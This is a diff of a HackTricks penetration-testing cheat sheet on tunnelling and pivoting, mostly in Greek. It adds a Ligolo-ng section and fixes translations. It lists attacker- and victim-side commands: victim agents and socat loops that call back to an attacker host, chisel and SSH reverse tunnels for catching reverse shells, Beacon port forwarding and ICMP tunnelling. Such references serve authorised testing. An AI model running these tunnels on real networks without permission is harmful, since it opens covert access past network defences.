@@ -1,16 +1,16 @@
 # Tunneling and Port Forwarding
 
 {% hint style="success" %}
-Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Υποστήριξη HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
-* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
@@ -18,7 +18,7 @@
 ## Nmap tip
 
 {% hint style="warning" %}
-**ICMP** και **SYN** σάρωσεις δεν μπορούν να περάσουν μέσω socks proxies, οπότε πρέπει να **απενεργοποιήσουμε την ανακάλυψη ping** (`-Pn`) και να καθορίσουμε **TCP σάρωσεις** (`-sT`) για να λειτουργήσει αυτό.
+**ICMP** και **SYN** σάρωσεις δεν μπορούν να περάσουν μέσω των socks proxies, οπότε πρέπει να **απενεργοποιήσουμε την ανακάλυψη ping** (`-Pn`) και να καθορίσουμε **TCP σάρωσεις** (`-sT`) για να λειτουργήσει αυτό.
 {% endhint %}
 
 ## **Bash**
@@ -74,7 +74,7 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 Αυτό είναι χρήσιμο για να αποκτήσετε αντίστροφες θήκες από εσωτερικούς υπολογιστές μέσω μιας DMZ στον υπολογιστή σας:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
-# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
+# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
 # Note that port 443 must be open
 # Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
 # and change the line "GatewayPorts no" to "GatewayPorts yes"
@@ -103,7 +103,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
-Μπορείτε να **tunnel** μέσω **ssh** όλη την **κυκλοφορία** σε ένα **υποδίκτυο** μέσω ενός κεντρικού υπολογιστή.\
+Μπορείτε να **tunnel** μέσω **ssh** όλη την **κυκλοφορία** σε ένα **υποδίκτυο** μέσω ενός host.\
 Για παράδειγμα, προωθώντας όλη την κυκλοφορία που πηγαίνει στο 10.10.10.0/24
 ```bash
 pip install sshuttle
@@ -167,14 +167,14 @@ rportfwd stop [bind port]
 ```
 To note:
 
-- Η αντίστροφη προώθηση θύρας του Beacon έχει σχεδιαστεί για να **δημιουργεί σήραγγες για την κυκλοφορία προς τον Team Server, όχι για αναμετάδοση μεταξύ μεμονωμένων μηχανών**.
-- Η κυκλοφορία είναι **δημιουργημένη σε σήραγγες μέσα στην κυκλοφορία C2 του Beacon**, συμπεριλαμβανομένων των P2P συνδέσεων.
+- Η αντίστροφη προώθηση θύρας του Beacon έχει σχεδιαστεί για να **συνδέει την κίνηση στον Server Ομάδας, όχι για αναμετάδοση μεταξύ μεμονωμένων μηχανών**.
+- Η κίνηση είναι **συνδεδεμένη μέσα στην κίνηση C2 του Beacon**, συμπεριλαμβανομένων των P2P συνδέσεων.
 - **Δικαιώματα διαχειριστή δεν απαιτούνται** για τη δημιουργία αντίστροφων προωθήσεων θύρας σε υψηλές θύρες.
 
 ### rPort2Port local
 
 {% hint style="warning" %}
-Σε αυτή την περίπτωση, η **θύρα ανοίγεται στον host του beacon**, όχι στον Team Server και η **κυκλοφορία αποστέλλεται στον πελάτη Cobalt Strike** (όχι στον Team Server) και από εκεί στον καθορισμένο host:port
+Σε αυτή την περίπτωση, η **θύρα ανοίγεται στον οικοδεσπότη beacon**, όχι στον Server Ομάδας και η **κίνηση αποστέλλεται στον πελάτη Cobalt Strike** (όχι στον Server Ομάδας) και από εκεί στον καθορισμένο host:port
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -206,6 +206,42 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ```bash
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
+```
+## Ligolo-ng
+
+[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
+
+**Χρησιμοποιήστε την ίδια έκδοση για τον πράκτορα και τον διακομιστή μεσολάβησης**
+
+### Tunneling
+```bash
+# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
+sudo ./proxy -selfcert
+# Create an interface named "ligolo" -- Attacker
+interface_create --name "ligolo"
+# Print the currently used certificate fingerprint -- Attacker
+certificate_fingerprint
+# Start the agent with certification validation -- Victim
+./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
+# Select the agent -- Attacker
+session
+1
+# Start the tunnel on the proxy server -- Attacker
+tunnel_start --tun "ligolo"
+# Display the agent's network configuration -- Attacker
+ifconfig
+# Create a route to the agent's specified network -- Attacker
+interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
+# Display the tun interfaces -- Attacker
+interface_list
+```
+### Σύνδεση και Ακρόαση Πράκτορα
+```bash
+# Establish a tunnel from the proxy server to the agent
+# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
+listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
+# Display the currently running listeners on the agent -- Attacker
+listener_list
 ```
 ## Rpivot
 
@@ -286,7 +322,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Remote Port2Port
 
-Συνδέστε την τοπική θύρα SSH (22) με την θύρα 443 του επιτιθέμενου υπολογιστή
+Συνδέστε την τοπική θύρα SSH (22) με την θύρα 443 του επιτιθέμενου.
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -338,13 +374,13 @@ C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
 netstat -antb | findstr 1080
 ```
-Τώρα μπορείτε να χρησιμοποιήσετε [**Proxifier**](https://www.proxifier.com/) **για να προξενήσετε την κίνηση μέσω αυτού του πόρου.**
+Τώρα μπορείτε να χρησιμοποιήσετε [**Proxifier**](https://www.proxifier.com/) **για να προξενήσετε την κίνηση μέσω αυτού του θύρας.**
 
-## Προξενίστε Εφαρμογές Windows GUI
+## Προξενήστε εφαρμογές Windows GUI
 
 Μπορείτε να κάνετε τις εφαρμογές Windows GUI να περιηγούνται μέσω ενός proxy χρησιμοποιώντας [**Proxifier**](https://www.proxifier.com/).\
-Στο **Profile -> Proxy Servers** προσθέστε τη διεύθυνση IP και τον πόρο του διακομιστή SOCKS.\
-Στο **Profile -> Proxification Rules** προσθέστε το όνομα του προγράμματος που θέλετε να προξενήσετε και τις συνδέσεις προς τις διευθύνσεις IP που θέλετε να προξενήσετε.
+Στο **Profile -> Proxy Servers** προσθέστε τη διεύθυνση IP και τη θύρα του διακομιστή SOCKS.\
+Στο **Profile -> Proxification Rules** προσθέστε το όνομα του προγράμματος που θέλετε να προξενήσετε και τις συνδέσεις στις διευθύνσεις IP που θέλετε να προξενήσετε.
 
 ## Παράκαμψη proxy NTLM
 
@@ -357,7 +393,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Αυθεντικοποιεί έναν proxy και δεσμεύει μια θύρα τοπικά που προωθείται στην εξωτερική υπηρεσία που καθορίζετε. Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το εργαλείο της επιλογής σας μέσω αυτής της θύρας.\
+Αυτή η εφαρμογή αυθεντικοποιείται έναντι ενός proxy και δεσμεύει μια θύρα τοπικά που προωθείται στην εξωτερική υπηρεσία που καθορίζετε. Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το εργαλείο της επιλογής σας μέσω αυτής της θύρας.\
 Για παράδειγμα, προωθήστε τη θύρα 443
 ```
 Username Alice
@@ -366,7 +402,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Τώρα, αν ρυθμίσετε για παράδειγμα στον θύμα την υπηρεσία **SSH** να ακούει στην πόρτα 443. Μπορείτε να συνδεθείτε σε αυτήν μέσω της θύρας 2222 του επιτιθέμενου.\
+Τώρα, αν ρυθμίσετε για παράδειγμα στο θύμα την υπηρεσία **SSH** να ακούει στην πόρτα 443. Μπορείτε να συνδεθείτε σε αυτή μέσω της θύρας του επιτιθέμενου 2222.\
 Μπορείτε επίσης να χρησιμοποιήσετε ένα **meterpreter** που συνδέεται στο localhost:443 και ο επιτιθέμενος ακούει στην πόρτα 2222.
 
 ## YARP
@@ -416,7 +452,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Αλλαγή DNS του proxychains
 
-Το Proxychains παρεμβαίνει στην κλήση `gethostbyname` της libc και στέλνει το tcp DNS αίτημα μέσω του socks proxy. Από **προεπιλογή**, ο **DNS** διακομιστής που χρησιμοποιεί το proxychains είναι **4.2.2.2** (σκληρά κωδικοποιημένος). Για να τον αλλάξετε, επεξεργαστείτε το αρχείο: _/usr/lib/proxychains3/proxyresolv_ και αλλάξτε τη διεύθυνση IP. Αν βρίσκεστε σε **περιβάλλον Windows**, μπορείτε να ορίσετε τη διεύθυνση IP του **domain controller**.
+Το Proxychains παρεμβαίνει στην κλήση `gethostbyname` της libc και στέλνει τα αιτήματα DNS tcp μέσω του socks proxy. Από **προεπιλογή**, ο **DNS** διακομιστής που χρησιμοποιεί το proxychains είναι **4.2.2.2** (σκληρά κωδικοποιημένος). Για να τον αλλάξετε, επεξεργαστείτε το αρχείο: _/usr/lib/proxychains3/proxyresolv_ και αλλάξτε τη διεύθυνση IP. Αν βρίσκεστε σε **περιβάλλον Windows**, μπορείτε να ορίσετε τη διεύθυνση IP του **domain controller**.
 
 ## Τούνελ σε Go
 
@@ -429,7 +465,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Απαιτείται root και στα δύο συστήματα για να δημιουργηθούν tun adapters και να μεταφερθούν δεδομένα μεταξύ τους χρησιμοποιώντας αιτήματα ICMP echo.
+Απαιτείται root και στα δύο συστήματα για να δημιουργηθούν οι προσαρμογείς tun και να μεταφερθούν δεδομένα μεταξύ τους χρησιμοποιώντας αιτήματα ICMP echo.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
